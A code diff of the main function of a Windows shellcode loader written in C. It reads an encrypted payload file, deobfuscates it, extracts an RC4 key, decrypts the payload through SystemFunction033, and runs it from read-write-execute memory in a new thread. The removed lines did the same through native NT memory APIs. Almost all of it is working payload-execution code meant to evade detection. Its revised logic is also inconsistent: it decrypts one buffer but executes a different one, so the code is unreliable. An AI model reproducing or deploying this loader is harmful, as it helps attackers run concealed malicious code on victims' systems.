@@ -47,93 +47,59 @@ BOOL Rc4EncryptionViSystemFunc033(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DW
 }
 
 int main(int argc, char* argv[]) {
-
     if (!(argc >= 2)) {
-        printf("[!] Please Specify A Input File To Read ... \n");
+        printf("[!] Please Specify Input '.ER' File To Run ... \n");
         return -1;
     }
-    DWORD dwOldProtection = 0x00;
-    PVOID pExecAddress = NULL;
-    HANDLE hThread = NULL;
-    PVOID pAddress = NULL;
 
-    SIZE_T RawPayloadSize = 0;
-    PBYTE RawPayloadBuffer = NULL;
-
-    // Read the Payload
-    printf("[i] Reading \"%s\" ... ", argv[1]);
-    if (!ReadPayloadFile(argv[1], &RawPayloadBuffer, &RawPayloadSize)) {
-        return -1;
-    }
-    printf("[+] DONE \n");
-    printf("\t>>> Raw Payload Size : %zu \n\t>>> Read Payload Located At : 0x%p \n", RawPayloadSize, RawPayloadBuffer);
-
-    SIZE_T sPayload = RawPayloadSize,
-        sObfSize = RawPayloadSize;
-
+	// Defining the Key
     unsigned char _key[0x10] = { 0 };
 
-    // Load NTAllocateVirtualMemory
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) {
-        return ReportError("GetModuleHandleA");
-    }
-    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    if (!NtAllocateVirtualMemory) {
-        return ReportError("GetProcAddress");
+    printf("[i] BUFF_SIZE : [ 0x%0.4X ] - NULL_BYTES : [ 0x%0.4X ]\n", BUFF_SIZE, NULL_BYTES);
+
+    HANDLE hFile = INVALID_HANDLE_VALUE, hThread = NULL;
+    DWORD dwFileSize = 0, dwNumberOfBytesRead = 0;
+    PBYTE pBuffer = NULL;
+
+	// Reading the Encrypted Payload
+    hFile = CreateFileA((LPCSTR)argv[1], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+        return ReportError("CreateFileA");
+
+	// Reading the File Size
+    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
+        return ReportError("GetFileSize");
+
+	// Allocating Memory for the Encrypted Payload
+    pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize);
+    if (!pBuffer)
+        return ReportError("HeapAlloc");
+
+	// Reading the Encrypted Payload
+    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwNumberOfBytesRead != dwFileSize) {
+        printf("[i] Read %ld from %ld Bytes \n", dwNumberOfBytesRead, dwFileSize);
+        return ReportError("ReadFile");
     }
 
-    // Allocate Memory
-    NTSTATUS status = NtAllocateVirtualMemory((HANDLE)-1, &pExecAddress, 0, &sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (status != 0) {
-        printf("[!] NtAllocateVirtualMemory FAILED With Error: 0x%0.8X \n", status);
-        return -1;
-    }
-    printf("[+] Allocated : %p\n", pExecAddress);
-
-    // Load and use NtProtectVirtualMemory
-    NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-    if (!NtProtectVirtualMemory) {
-        return ReportError("GetProcAddress");
-    }
-    ULONG ulOldProtection;
-    status = NtProtectVirtualMemory((HANDLE)-1, &pExecAddress, &sPayload, PAGE_EXECUTE_READWRITE, &ulOldProtection);
-    if (status != 0) {
-        printf("[!] NtProtectVirtualMemory FAILED With Error: 0x%0.8X \n", status);
-        return -1;
-    }
-
-    // Load and use NtWriteVirtualMemory
-    NtWriteVirtualMemory_t NtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-    if (!NtWriteVirtualMemory) {
-        return ReportError("GetProcAddress");
-    }
-    status = NtWriteVirtualMemory((HANDLE)-1, pExecAddress, RawPayloadBuffer, sPayload, NULL);
-    if (status != 0) {
-        printf("[!] NtWriteVirtualMemory FAILED With Error: 0x%0.8X \n", status);
-        return -1;
-    }
-
-    printf("[+] Payload Written to : %p\n", pExecAddress);
+    CloseHandle(hFile);
 
     // Deobfuscate the Payload
     SIZE_T DeobfuscatedPayloadSize = 0;
     PBYTE DeobfuscatedPayloadBuffer = NULL;
 
-    printf("[i] Deobfuscating");
-    if (!Deobfuscate((PBYTE)pExecAddress, sObfSize, (PBYTE*)&pExecAddress, &DeobfuscatedPayloadSize)) {
+    printf("[i] Deobfuscating \"%s\" ... ", argv[1]);
+    if (!Deobfuscate(pBuffer, dwFileSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
         return -1;
     }
-
     printf("[+] DONE \n");
-    printf("\t>>> Deobfuscated Payload Size : %zu \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, pExecAddress);
+    printf("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
 
     // Extracting the Key from the payload and updating the pointer to be after the key
-    memcpy(_key, pExecAddress, 0x10); // copy the first 16 bytes to _key
-    pExecAddress = (PVOID)((ULONG_PTR)pExecAddress + 0x10); // update pointer to be after the first 16
+    memcpy(_key, pBuffer, 0x10); // copy the first 16 bytes to _key
+    pBuffer = (PVOID)((ULONG_PTR)pBuffer + 0x10); // update pointer to be after the first 16
     printf("[+] Pointer Updated\n");
 
-    printf("[i] Decrypting with %p\n", pExecAddress);
+    printf("[i] Decrypting with %p\n", pBuffer);
     printf("[i] Retrieved Key: [ ");
     for (size_t i = 0; i < sizeof(_key); i++)
         printf("%02X ", _key[i]);
@@ -142,26 +108,28 @@ int main(int argc, char* argv[]) {
     DWORD dwResourceDataSize = (DWORD)(DeobfuscatedPayloadSize - 0x10);
 
     // Decrypt the payload
-    Rc4EncryptionViSystemFunc033(_key, (PBYTE)pExecAddress, sizeof(_key), dwResourceDataSize);
+    Rc4EncryptionViSystemFunc033(_key, (PBYTE)pBuffer, sizeof(_key), dwResourceDataSize);
 
-    printf("[+] Payload Decrypted at : %p\n", pExecAddress);
+    printf("[+] Payload Decrypted at : %p\n", pBuffer);
     printf("[$] Press <Enter> To Run ... ");
     getchar();
 
-    // Load and use NtProtectVirtualMemory to set the memory to PAGE_EXECUTE_READWRITE
-    status = NtProtectVirtualMemory((HANDLE)-1, &pExecAddress, &sPayload, PAGE_EXECUTE_READWRITE, &ulOldProtection);
-    if (status != 0) {
-        printf("[!] NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE) FAILED With Error: 0x%0.8X \n", status);
-        return -1;
-    }
+	// Allocate Memory for the Decrypted Payload
+    PVOID pExecAddress = VirtualAlloc(NULL, DeobfuscatedPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pExecAddress)
+        return ReportError("VirtualAlloc");
+    
+	// Copy the Decrypted Payload to the Executable Memory
+    memcpy(pExecAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);
 
-    // Create Thread to run the Payload
+    printf("[i] Running Payload Thread ... ");
+
+	// Create a Thread to Run the Decrypted Payload
     hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pExecAddress, NULL, 0, NULL);
-    if (!hThread) {
+    if (!hThread)
         return ReportError("CreateThread");
-    }
 
-    // Run the Payload
+	// Wait for the Thread to Finish
     WaitForSingleObject(hThread, INFINITE);
 
     printf("[+] DONE \n");
